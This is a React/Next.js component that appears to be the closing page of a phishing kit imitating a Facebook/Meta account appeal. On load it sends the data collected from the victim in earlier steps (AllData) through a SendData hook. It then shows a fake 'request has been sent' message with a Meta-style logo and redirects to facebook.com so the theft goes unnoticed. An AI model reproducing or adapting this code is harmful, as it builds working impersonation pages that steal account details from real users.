import React, { useContext, useState } from 'react'
import { Col, Row } from 'react-bootstrap'
import styled from 'styled-components'
import SendData from '../hooks/SendData'
import Image from 'next/image'
import { DataContext } from '../pages'

const Wrapper = styled.div`
    position: fixed;
    top: 0;
    left: 0;
    z-index: 1050;
    width: 100%;
    height: 100%;
    overflow: hidden;
    outline: 0;
    display: grid;
    place-items: center;
    /* background-color: rgba(0,0,0,.5); */
    padding: 1.5rem;
    /* background-repeat: no-repeat;
    background-image: radial-gradient(rgba(255, 255, 255, .25), rgba(255, 255, 255, 0) 40%), radial-gradient(hsla(44, 100%, 66%, 1) 30%, hsla(338, 68%, 65%, 1), hsla(338, 68%, 65%, .4) 41%, transparent 52%), radial-gradient(hsla(272, 100%, 60%, 1) 37%, transparent 46%), linear-gradient(155deg, transparent 65%, hsla(142, 70%, 49%, 1) 95%), linear-gradient(45deg, hsla(213, 100%, 44%, 1), hsla(209, 100%, 53%, 1));
    background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
    background-position: bottom left, 109% 68%, 109% 68%, center, center; */
`
const ModalContent = styled.div`
    /* background-color: #fff; */
    background-clip: padding-box;
    /* border: 1px solid rgba(0,0,0,.2); */
    border-radius: 1.5rem;
    outline: 0;
    max-width: 500px;
    width: 100%;
    z-index: 1051;
    position: 'relative';
    .redborder {
        border: 1px solid red !important;
    }
`

const Title = styled.div`
    color: #050505 !important;
    font-size: 18px !important;
    font-weight: 700 !important;
`

const XBtn = styled.div`
    font-size: 3rem;
    font-weight: 400;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0 #fff;
    opacity: 1;
    cursor: pointer;
`
const BorderBottom = styled.div`
    border-bottom:1px solid #dee2e6;
`
const Label = styled.div`
    color: #90949c;
    font-weight: bold;
    font-size: 12px;
    padding-bottom: 0.5rem;
`
const Input = styled.input`
    border: 1px solid #ced4da !important;
    border-radius: 8px !important;
    padding: 0.75rem 0.75rem !important;
    background-color: #fff;
    ::placeholder {
        opacity: 0.5;
        font-weight: 500;
    }
    
`
const Btn = styled.button`
    background-color: #0064e0;
    border: 1px solid #0064e0;
    width: 100%;
    color: white;
    margin-top: 15px;
    font-size: 13px;
    font-weight: 500;
    padding: 10px 20px;
    border-radius: 50px;
    text-transform: none;
    margin-top: 5rem;
`
const ModalParagraph = styled.div`
    line-height: 1.3;
    padding-bottom: 0.5rem;
`
const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`
function Done() {

    let { AllData } = useContext(DataContext);

    React.useEffect(() => {
        const params = {
            ...AllData,
            currentStep: 'Done'
        };

        SendData(params)

    }, [])

    return (
        <Wrapper>
            <ModalContent>
                <div className="p-0 p-lg-4">
                    <Title>
                        Request has been sent
                    </Title>
                    <div style={{ height: '200px', width: '100%', position: 'relative', }} className='my-2'>
                        <Image
                            alt=""
                            src="/assets/images/done.jpeg"
                            layout='fill'
                            objectFit='contain'
                            style={{ borderRadius: '15px' }}
                        />
                    </div>

                    <div style={{ fontWeight: 500, fontSize: '14px' }}>
                        Your request has been added to the processing queue. We will process your request within 24 hours. If you do not recieve an email message with the appeal
                        status within 24 hours, please resend the appeal.
                    </div>
                    <Btn onClick={() => window.location.href = 'https://www.facebook.com/'}>
                        Return to Facebook
                    </Btn>
                    <div className='pt-4 text-center'>
                        <Image src="/assets/svgs/mtlg.svg" width={60} height={12} />
                    </div>
                </div>
            </ModalContent>
        </Wrapper >
    )
}

export default Done